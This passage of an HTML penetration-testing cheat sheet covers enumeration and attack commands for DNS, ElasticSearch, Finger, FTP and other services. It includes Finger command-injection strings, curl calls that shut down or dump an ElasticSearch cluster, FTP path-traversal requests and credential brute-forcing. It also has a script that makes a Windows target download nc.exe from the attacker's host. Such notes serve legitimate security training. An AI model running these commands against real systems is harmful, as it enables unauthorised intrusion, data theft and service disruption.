<span class="o">**</span><span class="n">Hardening</span><span class="o">**</span>
<span class="o">**</span><span class="k">References</span><span class="o">**</span>
</pre></div>

<h2 id="citrix-1494tcp">Citrix - 1494/tcp<a class="headerlink" href="#citrix-1494tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Enumeration:
    <div class="codehilite"><pre><span></span>./citrix-pa-scan <span class="o">{</span>IP_address/file <span class="p">|</span> - <span class="p">|</span> random<span class="o">}</span> <span class="o">[</span>timeout<span class="o">]</span>
citrix-pa-proxy.pl IP_to_proxy_to <span class="o">[</span>Local_IP<span class="o">]</span>
</pre></div></li>
</ul>
<h2 id="dhcp">DHCP<a class="headerlink" href="#dhcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Get new IP address from DHCP:<ul>
<li>Send <code class="codehilite"><span class="n">DHCPDISCOVER</span></code></li>
<li>Receive <code class="codehilite"><span class="n">DHCPOFFER</span></code>
  <div class="codehilite"><pre><span></span><span class="n">dhclient</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="dns-53tcp">DNS - 53/tcp<a class="headerlink" href="#dns-53tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>DNS on TCP<ul>
<li>Check for zone transfers</li>
<li>Maybe DNS Sec enabled</li>
</ul>
</li>
</ul>
<ul>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="k">host</span><span class="p">.</span><span class="n">conf</span>
<span class="n">resolv</span><span class="p">.</span><span class="n">conf</span>
<span class="n">named</span><span class="p">.</span><span class="n">conf</span>
</pre></div></li>
<li>Order of name resolution: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nsswitch</span><span class="p">.</span><span class="n">conf</span></code></li>
<li>DNS sever Information: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">resolv</span><span class="p">.</span><span class="n">conf</span></code></li>
<li>Forward Lookup<ul>
<li>whois
  <div class="codehilite"><pre><span></span>whois example.com
whois <span class="m">50</span>.7.67.186 <span class="o">(</span>reverse<span class="o">)</span>
</pre></div></li>
</ul>
</li>
<li>Reverse Lookup<ul>
<li>write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192)</li>
<li>append “.in-addr.arpa.” to it.
  <div class="codehilite"><pre><span></span>dig <span class="m">1</span>.1.168.192.in-addr.arpa. PTR
</pre></div>
  <div class="codehilite"><pre><span></span><span class="k">for</span> ip in <span class="k">$(</span>seq <span class="m">155</span> <span class="m">190</span><span class="k">)</span><span class="p">;</span><span class="k">do</span> host <span class="m">50</span>.7.67.<span class="nv">$ip</span><span class="p">;</span><span class="k">done</span> <span class="p">|</span>grep -­‐v <span class="s2">&quot;not found&quot;</span>
</pre></div></li>
<li><a href="https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works">https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works</a></li>
</ul>
</li>
</ul>
<ul>
<li>Zone Transfers<ul>
<li>Copying of the zone file from a master DNS server to a slave server
  <div class="codehilite"><pre><span></span>host -t axfr domain.name dns-server
</pre></div></li>
<li>Root zone: <code class="codehilite"><span class="n">dig</span><span class="w"> </span><span class="n">axfr</span><span class="w"> </span><span class="nv">@dns</span><span class="o">-</span><span class="n">server</span><span class="w"></span></code></li>
<li>Domain name:<ul>
<li><code class="codehilite"><span class="n">dig</span><span class="w"> </span><span class="n">axfr</span><span class="w"> </span><span class="nv">@dns</span><span class="o">-</span><span class="n">server</span><span class="w"> </span><span class="k">domain</span><span class="p">.</span><span class="n">name</span><span class="w"></span></code></li>
<li><code class="codehilite"><span class="k">host</span> <span class="o">-</span><span class="n">l</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">ns1</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span></code></li>
<li><code class="codehilite"><span class="n">dnsrecon</span> <span class="o">-</span><span class="n">d</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">t</span> <span class="n">axfr</span></code></li>
<li><code class="codehilite"><span class="n">nmap</span> <span class="err">$</span><span class="n">ip</span> <span class="c1">--script=dns-zone-transfer -p 53</span></code></li>
</ul>
</li>
<li>Simple Zone Transfer Script:
  <div class="codehilite"><pre><span></span><span class="c1">#/bin/bash</span>
<span class="c1"># Simple Zone Transfer Bash Script</span>
<span class="c1"># $1 is the first argument given after the bash script</span>
<span class="c1"># Check if argument was given, if not, print usage</span>
<span class="k">if</span> <span class="o">[</span> -­‐z <span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
<span class="nb">echo</span> <span class="s2">&quot;[*] Simple Zone transfer script&quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;[*] Usage : </span><span class="nv">$0</span><span class="s2"> &lt;domain name&gt; &quot;</span>
<span class="nb">exit</span> <span class="m">0</span>
<span class="k">fi</span>

<span class="c1"># if argument was given, identify the DNS servers for the domain</span>
<span class="k">for</span> server in <span class="k">$(</span>host -­‐t ns <span class="nv">$1</span> <span class="p">|</span>cut -­‐d<span class="s2">&quot; &quot;</span> -­‐f4<span class="k">)</span><span class="p">;</span><span class="k">do</span>
<span class="c1"># For each of these servers, attempt a zone transfer</span>
host -­l <span class="nv">$1</span> <span class="nv">$server</span> <span class="p">|</span>grep <span class="s2">&quot;has address&quot;</span>
<span class="k">done</span>
</pre></div></li>
</ul>
</li>
<li>Bruteforcing
    <div class="codehilite"><pre><span></span><span class="n">fierce</span> <span class="o">-</span><span class="n">dns</span> <span class="n">site</span><span class="p">.</span><span class="n">com</span>
<span class="n">fierce</span> <span class="o">-</span><span class="n">dns</span> <span class="n">site</span><span class="p">.</span><span class="n">com</span> <span class="o">-</span><span class="n">dnserver</span> <span class="n">ns1</span><span class="p">.</span><span class="n">site</span><span class="p">.</span><span class="n">com</span>

<span class="n">dnsenum</span> <span class="n">site</span><span class="p">.</span><span class="n">com</span> <span class="err">–</span><span class="n">dnsserver</span> <span class="n">ns1</span><span class="p">.</span><span class="n">site</span><span class="p">.</span><span class="n">com</span>
<span class="n">dnsenum</span> <span class="n">site</span><span class="p">.</span><span class="n">com</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">hostlist</span><span class="p">.</span><span class="n">txt</span>
</pre></div></li>
<li>Subdomain bruteforcing
    <div class="codehilite"><pre><span></span><span class="k">for</span> ip in <span class="k">$(</span>cat list.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span> host <span class="nv">$ip</span>.<span class="nv">$website</span><span class="p">;</span> <span class="k">done</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">for</span> domain in <span class="k">$(</span>cat /usr/share/wordlists/dnscan/subdomains-100.txt<span class="k">)</span><span class="p">;</span>
<span class="k">do</span> host <span class="nv">$domain</span>.mydomain.com<span class="p">;</span>sleep <span class="m">2</span><span class="p">;</span><span class="k">done</span> <span class="p">|</span> grep has <span class="p">|</span> sort -u
</pre></div></li>
<li>Reverse dns lookup bruteforcing
    <div class="codehilite"><pre><span></span><span class="k">for</span> ip in <span class="k">$(</span>seq <span class="m">155</span> <span class="m">190</span><span class="k">)</span><span class="p">;</span><span class="k">do</span> host <span class="m">50</span>.7.67.<span class="nv">$ip</span><span class="p">;</span><span class="k">done</span> <span class="p">|</span>grep -v <span class="s2">&quot;not found&quot;</span>
</pre></div></li>
<li>DNS Recon Workflow (WIP)<ul>
<li>1) Get the host's addresse (A record).</li>
<li>2) Get the namservers (threaded).</li>
<li>3) Get the MX record (threaded).</li>
<li>4) Perform axfr queries on nameservers and get BIND VERSION (threaded).</li>
<li>5) Get extra names and subdomains via google scraping (google query = "allinurl: -www site:domain").</li>
<li>6) Brute force subdomains from file</li>
<li>7) Calculate C class domain network ranges and perform whois queries on them (threaded).</li>
<li>8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded).</li>
<li>9) Write to domain_ips.txt file ip-blocks.</li>
</ul>
</li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Dnsrecon
    <div class="codehilite"><pre><span></span>dnsrecon -r <span class="m">127</span>.0.0.0/24 -n <span class="m">10</span>.10.10.29
dnsrecon -r <span class="m">127</span>.0.1.0/24 -n <span class="m">10</span>.10.10.29
dnsrecon -r <span class="m">10</span>.10.10.0/24 -n <span class="m">10</span>.10.10.29

dnsrecon -d thinc.local -n <span class="m">10</span>.11.1.220 -t axfr -r <span class="m">10</span>.11.1.0/24
dnsrecon -d site.com
</pre></div></li>
<li>host
    <div class="codehilite"><pre><span></span>host -t ns example.com
host -t mx example.com

host www.example.com -&gt; results in IP address
host nonexistent.example.com -&gt; results in not found error

host -l site.com ns2.site.com
</pre></div>
    <div class="codehilite"><pre><span></span>host -l friendzone.red <span class="m">10</span>.10.10.123<span class="p">|</span> grep <span class="s1">&#39;has address&#39;</span><span class="p">|</span>awk <span class="s1">&#39;{print $1}&#39;</span>
</pre></div></li>
<li>nslookup
    <div class="codehilite"><pre><span></span>nslookup &lt;ip&gt;

nslookup site.com
nslookup -query<span class="o">=</span>mx site.com
nslookup -query<span class="o">=</span>ns site.com
nslookup -query<span class="o">=</span>any site.com
</pre></div>
    <div class="codehilite"><pre><span></span>&gt; <span class="nb">set</span> <span class="nv">type</span><span class="o">=</span>a
&gt; google.com

&gt; server ns1.google.com
&gt; google.com
</pre></div></li>
<li>dig
    <div class="codehilite"><pre><span></span><span class="c1"># Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}</span>
<span class="c1">#            {global-d-opt} host [@local-server] {local-d-opt}</span>
<span class="c1">#            [ host [@local-server] {local-d-opt} [...]]</span>

dig google.com
dig google.com mx
dig @ns1.google.com google.com

dig site.com
dig site.com A
dig +nocmd shite.com MX +noall +answer
dig +nocmd site.com NS +noall +answer
dig +nocmd site.com A +noall +answer
dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer
</pre></div></li>
<li>fierce: <a href="https://github.com/davidpepper/fierce-domain-scanner">https://github.com/davidpepper/fierce-domain-scanner</a><ul>
<li>scanner that helps locate non-contiguous IP space and hostnames against specified domains.</li>
<li>pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for</li>
<li>General checks: <code class="codehilite"><span class="n">fierce</span> <span class="o">-</span><span class="n">dns</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span></code></li>
<li>Wordlist attack: <code class="codehilite"><span class="n">fierce</span> <span class="o">-</span><span class="n">dns</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="o">-</span><span class="n">wordlist</span> <span class="n">hosts</span><span class="p">.</span><span class="n">list</span></code></li>
</ul>
</li>
<li>recon-ng
    <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">recon</span><span class="o">/</span><span class="n">contacts</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">whois_pocs</span>
<span class="k">set</span> <span class="k">DOMAIN</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span>
<span class="n">run</span>

<span class="n">use</span> <span class="n">recon</span><span class="o">/</span><span class="n">hosts</span><span class="o">/</span><span class="n">enum</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">xssed</span>
<span class="n">use</span> <span class="n">recon</span><span class="o">/</span><span class="n">hosts</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">google_site</span>
<span class="n">use</span> <span class="n">recon</span><span class="o">/</span><span class="n">hosts</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">ip_neighbor</span>
</pre></div></li>
<li>dnsenum
    <div class="codehilite"><pre><span></span><span class="n">dnsenum</span> <span class="err">$</span><span class="n">ip</span>
</pre></div></li>
<li>dnsrecon
    <div class="codehilite"><pre><span></span><span class="n">dnsrecon</span>
<span class="n">dnsrecon</span> <span class="err">‐</span><span class="n">d</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="err">‐</span><span class="n">t</span> <span class="n">axfr</span>

<span class="n">dnsenum</span>
<span class="n">dnsenum</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span>
</pre></div></li>
<li>subbrute<ul>
<li>Recursively crawls enumerated DNS records</li>
<li>Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting</li>
</ul>
</li>
<li>knock<ul>
<li>Wordlist based subdomain bruteforcing</li>
<li>Virustotal search</li>
</ul>
</li>
<li>Sublist3r<ul>
<li>Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS</li>
<li>Can do "subbrute" scans internally</li>
<li>Can do port scans internally</li>
</ul>
</li>
<li>Online Services<ul>
<li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
</ul>
</li>
</ul>
<p><strong>Hardening</strong>
<strong>References</strong></p>
<ul>
<li>Payload Delivery Over DNS: <a href="https://github.com/no0be/DNSlivery">https://github.com/no0be/DNSlivery</a></li>
<li>DNS Rebind Toolkit <a href="https://github.com/Kinimiwar/dns-rebind-toolkit">https://github.com/Kinimiwar/dns-rebind-toolkit</a></li>
<li>Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: <a href="https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/">https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/</a></li>
</ul>
<h2 id="elasticsearch-9200tcp">ElasticSearch - 9200/tcp<a class="headerlink" href="#elasticsearch-9200tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<p><strong>Interesting APIs</strong></p>
<table>
<thead>
<tr>
<th align="left">Description</th>
<th align="left">URL</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Config information, OS, JVM version</td>
<td align="left"><code class="codehilite"><span class="n">curl</span> <span class="o">-</span><span class="n">XGET</span> <span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">9200</span><span class="o">/</span><span class="n">_nodes</span><span class="o">?</span><span class="n">pretty</span><span class="o">=</span><span class="k">true</span></code></td>
</tr>
<tr>
<td align="left">Shutdown</td>
<td align="left"><code class="codehilite"><span class="n">curl</span> <span class="o">-</span><span class="n">XPOST</span> <span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">9200</span><span class="o">/</span><span class="n">_cluster</span><span class="o">/</span><span class="n">nodes</span><span class="o">/</span><span class="n">_master</span><span class="o">/</span><span class="n">_shutdown</span></code></td>
</tr>
<tr>
<td align="left">Dump data</td>
<td align="left"><code class="codehilite"><span class="n">curl</span> <span class="ss">&quot;http://&lt;ip&gt;:9200/_search?size=10000&amp;pretty=true&quot;</span></code></td>
</tr>
<tr>
<td align="left">Snapshots</td>
<td align="left"><code class="codehilite"><span class="n">_snapshot</span></code></td>
</tr>
</tbody>
</table>
<p><strong>Hardening</strong></p>
<ul>
<li><code class="codehilite"><span class="n">elasticsearch</span><span class="p">.</span><span class="n">yml</span></code> - to prevent dynamic scripting:
    <div class="codehilite"><pre><span></span><span class="n">script</span><span class="p">.</span><span class="n">disable_dynamic</span><span class="p">:</span> <span class="k">true</span>
</pre></div></li>
<li><a href="https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1">https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1</a></li>
</ul>
<h2 id="finger-79tcp">Finger - 79/tcp<a class="headerlink" href="#finger-79tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>User enumeration
    <div class="codehilite"><pre><span></span>finger @example.com
finger <span class="s1">&#39;a b c d e f g h&#39;</span> @example.com
finger <span class="s1">&#39;1 2 3 4 5 6 7 8 9 0&#39;</span>@target_host
finger admin@example.com
finger user@example.com
finger <span class="m">0</span>@example.com
finger .@example.com
finger **@example.com
finger test@example.com
</pre></div><ul>
<li><a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">http://pentestmonkey.net/tools/user-enumeration/finger-user-enum</a>
  <div class="codehilite"><pre><span></span><span class="n">finger</span><span class="o">-</span><span class="k">user</span><span class="o">-</span><span class="n">enum</span><span class="p">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">U</span> <span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="k">Names</span><span class="o">/</span><span class="k">names</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">t</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span>
</pre></div></li>
<li><a href="https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh">https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh</a></li>
</ul>
</li>
<li>Finger Redirect
    <div class="codehilite"><pre><span></span>finger @target_host1@target_host2
</pre></div></li>
<li>Command execution
    <div class="codehilite"><pre><span></span>finger <span class="s2">&quot;|/bin/id@example.com&quot;</span>
finger <span class="s2">&quot;|/bin/ls -a /@example.com&quot;</span>
</pre></div></li>
<li>Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay.
    <div class="codehilite"><pre><span></span>finger@host.com@victim.com
</pre></div></li>
</ul>
<p><strong>References</strong></p>
<ul>
<li>Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: <a href="http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html">http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html</a></li>
<li><a href="http://0daysecurity.com/penetration-testing/enumeration.html">http://0daysecurity.com/penetration-testing/enumeration.html</a></li>
</ul>
<h2 id="ftp-21tcp">FTP - 21/tcp<a class="headerlink" href="#ftp-21tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Scan for anonymous FTP: <code class="codehilite"><span class="n">nmap</span> <span class="err">‐</span><span class="n">v</span> <span class="err">‐</span><span class="n">p</span> <span class="mi">21</span> <span class="o">-</span><span class="err">­‐</span><span class="n">script</span><span class="o">=</span><span class="n">ftp</span><span class="err">‐</span><span class="n">anon</span><span class="p">.</span><span class="n">nse</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">200</span><span class="o">-</span><span class="mi">254</span></code></li>
<li>NSE: <code class="codehilite"><span class="n">nmap</span> <span class="c1">--script=*ftp* --script-args=unsafe=1 -p 20,21 &lt;IP&gt;</span></code></li>
<li>Anonymous login
    <div class="codehilite"><pre><span></span><span class="nv">ftp</span> <span class="nv">ip_address</span>
<span class="nv">Username</span>: <span class="nv">anonymous</span>
<span class="nv">Password</span>: <span class="nv">any</span>@<span class="nv">email</span>.<span class="nv">com</span> <span class="ss">(</span><span class="k">if</span> <span class="nv">prompted</span><span class="ss">)</span>
</pre></div></li>
<li>Clone: <code class="codehilite"><span class="n">wget</span> <span class="o">-</span><span class="n">r</span> <span class="c1">--no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS)</span></code></li>
<li>Config files
    <div class="codehilite"><pre><span></span><span class="n">ftpusers</span>
<span class="n">ftp</span><span class="p">.</span><span class="n">conf</span>
<span class="n">proftpd</span><span class="p">.</span><span class="n">conf</span>
</pre></div></li>
<li>MITM<ul>
<li>pasvagg.pl: <a href="https://packetstormsecurity.com/0007-exploits/pasvagg.pl">https://packetstormsecurity.com/0007-exploits/pasvagg.pl</a></li>
</ul>
</li>
<li>Common FTP Commands
    <div class="codehilite"><pre><span></span><span class="k">GET</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">boot</span><span class="p">.</span><span class="n">ini</span>
<span class="k">GET</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">boot</span><span class="p">.</span><span class="n">ini</span>
<span class="n">MGET</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">boot</span><span class="p">.</span><span class="n">ini</span>
<span class="n">MGET</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">boot</span><span class="p">.</span><span class="n">ini</span>
</pre></div></li>
</ul>
<table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">?</td>
<td align="left">Request help</td>
</tr>
<tr>
<td align="left">ascii</td>
<td align="left">Set the mode of file transfer to ASCII (default / transmits 7bits per character)</td>
</tr>
<tr>
<td align="left">binary</td>
<td align="left">Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files)</td>
</tr>
<tr>
<td align="left">bye</td>
<td align="left">Exit the FTP environment (same as quit)</td>
</tr>
<tr>
<td align="left">cd</td>
<td align="left">Change directory on the remote machine</td>
</tr>
<tr>
<td align="left">close</td>
<td align="left">Rerminate a connection with another computer</td>
</tr>
<tr>
<td align="left">close brubeck</td>
<td align="left">Closes the current FTP connection with brubeck, but still leaves you within the FTP environment.</td>
</tr>
<tr>
<td align="left">delete</td>
<td align="left">Delete a file in the current remote directory (same as rm in UNIX)</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">Copy one file from the remote machine to the local machine</td>
</tr>
<tr>
<td align="left">get ABC DEF</td>
<td align="left">Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory.</td>
</tr>
<tr>
<td align="left">get ABC</td>
<td align="left">Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory.</td>
</tr>
<tr>
<td align="left">help</td>
<td align="left">Request a list of all available FTP command</td>
</tr>
<tr>
<td align="left">lcd</td>
<td align="left">Change directory on your local machine (same as UNIX cd)</td>
</tr>
<tr>
<td align="left">ls</td>
<td align="left">List the names of the files in the current remote directory</td>
</tr>
<tr>
<td align="left">mkdir</td>
<td align="left">Make a new directory within the current remote directory</td>
</tr>
<tr>
<td align="left">mget</td>
<td align="left">Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file</td>
</tr>
<tr>
<td align="left">mget *</td>
<td align="left">Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *.</td>
</tr>
<tr>
<td align="left">mput</td>
<td align="left">Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file</td>
</tr>
<tr>
<td align="left">open</td>
<td align="left">Open a connection with another computer</td>
</tr>
<tr>
<td align="left">open brubeck</td>
<td align="left">Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection).</td>
</tr>
<tr>
<td align="left">put</td>
<td align="left">Copy one file from the local machine to the remote machine</td>
</tr>
<tr>
<td align="left">pwd</td>
<td align="left">Find out the pathname of the current directory on the remote machine</td>
</tr>
<tr>
<td align="left">quit</td>
<td align="left">Exit the FTP environment (same as bye)</td>
</tr>
<tr>
<td align="left">rmdir</td>
<td align="left">Remove a directory in the current remote directory</td>
</tr>
</tbody>
</table>
<ul>
<li>Bruteforcing 
    <div class="codehilite"><pre><span></span>patator ftp_login <span class="nv">host</span><span class="o">=</span><span class="m">10</span>.11.1.220 <span class="nv">port</span><span class="o">=</span><span class="m">21</span> <span class="nv">user</span><span class="o">=</span>COMBO0 <span class="nv">password</span><span class="o">=</span>COMBO01 <span class="nv">0</span><span class="o">=</span>/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep<span class="o">=</span>’Login or password incorrect’

patator ftp_login <span class="nv">host</span><span class="o">=</span>/root/oscp/lab-net2019/ftp-open.txt <span class="nv">port</span><span class="o">=</span><span class="m">21</span> <span class="nv">user</span><span class="o">=</span>COMBO0 <span class="nv">password</span><span class="o">=</span>COMBO01 <span class="nv">0</span><span class="o">=</span>/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep<span class="o">=</span>’Login or password incorrect’

patator ftp_login <span class="nv">host</span><span class="o">=</span>FILE0 <span class="nv">port</span><span class="o">=</span><span class="m">21</span> <span class="nv">user</span><span class="o">=</span>COMBO0 <span class="nv">password</span><span class="o">=</span>COMBO1 <span class="nv">0</span><span class="o">=</span>/root/oscp/lab-net2019/ftp-open.txt <span class="nv">1</span><span class="o">=</span>/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep<span class="o">=</span>’Login or password incorrect’ -x ignore:fgrep<span class="o">=</span>’cannot log in.’ -x ignore:fgrep<span class="o">=</span>’Login incorrect’ -l ftp_spray
</pre></div></li>
<li>TCP FTP Bounce Scan: <code class="codehilite"><span class="n">nmap</span> <span class="err">–</span><span class="n">top</span><span class="o">-</span><span class="n">ports</span> <span class="mi">1000</span> <span class="o">-</span><span class="n">vv</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">b</span> <span class="nl">anonymous</span><span class="p">:</span><span class="n">password</span><span class="mf">@10.11.1.125</span><span class="o">:</span><span class="mi">21</span> <span class="mf">127.0.0.1</span></code></li>
<li>Script FTP 
    <div class="codehilite"><pre><span></span><span class="nv">echo</span> <span class="nv">open</span> <span class="ss">(</span><span class="nv">YOUR</span> <span class="nv">IP</span><span class="ss">)</span> <span class="mi">21</span> <span class="o">&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span> <span class="ss">(</span><span class="nv">Writeable</span> <span class="nv">Directory</span> <span class="nv">on</span> <span class="nv">target</span><span class="ss">)</span>
<span class="nv">echo</span> <span class="nv">USER</span> <span class="nv">pwnt</span> <span class="o">&gt;&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span>
<span class="nv">echo</span> <span class="nv">passwd</span> <span class="o">&gt;&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span> <span class="ss">(</span><span class="nv">Password</span> <span class="k">for</span> <span class="nv">your</span> <span class="nv">FTP</span> <span class="nv">Server</span><span class="ss">)</span>
<span class="nv">echo</span> <span class="nv">bin</span> <span class="o">&gt;&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span> <span class="ss">(</span><span class="nv">Sets</span> <span class="nv">transfer</span> <span class="nv">up</span> <span class="k">for</span> <span class="nv">binary</span> <span class="nv">files</span><span class="o">/</span><span class="nv">bytes</span><span class="ss">)</span>
<span class="nv">echo</span> <span class="nv">GET</span> <span class="nv">nc</span>.<span class="nv">exe</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">nc</span>.<span class="nv">exe</span><span class="o">&gt;&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span>
<span class="nv">echo</span> <span class="nv">bye</span> <span class="o">&gt;&gt;</span> <span class="nv">C</span>:\<span class="nv">share</span>\<span class="nv">ftp</span>.<span class="nv">txt</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">ftp</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">s</span><span class="p">:</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="k">share</span><span class="err">\</span><span class="n">ftp</span><span class="p">.</span><span class="n">txt</span>
</pre></div></li>
</ul>
<p><strong>Tools</strong>
<strong>Hardening</strong>
<strong>References</strong></p>
<h2 id="imap-134tcp-993tcp">IMAP - 134/tcp 993/tcp<a class="headerlink" href="#imap-134tcp-993tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li><a href="https://tools.ietf.org/html/rfc3501">https://tools.ietf.org/html/rfc3501</a></li>
<li><a href="https://busylog.net/telnet-imap-commands-note/">Cheatsheet - https://busylog.net/telnet-imap-commands-note/</a></li>
<li><a href="https://k9mail.github.io/documentation/development/imapExtensions.html">IMAP Capabilities &amp; Commands Extensions</a></li>
</ul>
<ul>
<li>Connecting<ul>
<li>Port 143 (plain / no SSL)
  <div class="codehilite"><pre><span></span><span class="n">telnet</span> <span class="o">&lt;</span><span class="n">IP</span><span class="o">&gt;</span> <span class="mi">143</span>
<span class="n">nc</span> <span class="c1">--crlf --verbose &lt;IP&gt; 143</span>
</pre></div></li>
<li>Port 993 (SSL)
  <div class="codehilite"><pre><span></span><span class="nv">openssl</span> <span class="nv">s_client</span> <span class="o">-</span><span class="k">connect</span> <span class="o">&lt;</span><span class="nv">IP</span><span class="o">&gt;</span>:<span class="mi">993</span>
<span class="nv">openssl</span> <span class="nv">s_client</span> <span class="o">-</span><span class="k">connect</span> <span class="o">&lt;</span><span class="nv">IP</span><span class="o">&gt;</span>:<span class="mi">993</span> <span class="o">-</span><span class="nv">crlf</span> <span class="o">-</span><span class="nv">quiet</span>
</pre></div></li>
</ul>
</li>
<li>Command Format<ul>
